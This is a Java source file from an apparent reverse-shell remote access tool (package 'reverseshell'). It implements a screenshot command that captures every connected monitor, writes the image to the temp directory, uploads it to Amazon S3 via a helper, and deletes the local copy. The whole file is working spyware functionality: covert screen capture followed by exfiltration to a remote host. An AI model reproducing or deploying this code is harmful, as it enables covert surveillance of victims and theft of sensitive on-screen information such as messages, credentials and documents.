package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.S3UploadUtil;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;

public class ScreenShotCommand implements Command {


    @Override
    public String executeCommand(String command) {
        File screenshotFile = captureMultiMonitorScreenshot("screenshot.png");
        if (screenshotFile != null) {
            String output = S3UploadUtil.uploadToS3(screenshotFile);
            screenshotFile.delete();

            return output ;
        }

        return "Failed to take screenshot" ;
    }




    public static File captureMultiMonitorScreenshot(String fileName) {
        try {
            // Get all screen devices
            GraphicsDevice[] screenDevices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();

            // Calculate the bounds that cover all screens
            Rectangle allScreensBounds = new Rectangle();
            for (GraphicsDevice screenDevice : screenDevices) {
                allScreensBounds = allScreensBounds.union(screenDevice.getDefaultConfiguration().getBounds());
            }

            // Capture the content of all screens
            Robot robot = new Robot();
            BufferedImage screenshot = robot.createScreenCapture(allScreensBounds);

            // Determine the temporary directory
            String tmpDir = System.getProperty("java.io.tmpdir");
            File outputFile = new File(tmpDir, fileName);

            // Save the multi-monitor screenshot to the temporary directory
            ImageIO.write(screenshot, "png", outputFile);

            System.out.println("Multi-monitor screenshot saved to " + outputFile.getAbsolutePath());
            return outputFile;
        } catch (AWTException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }



}
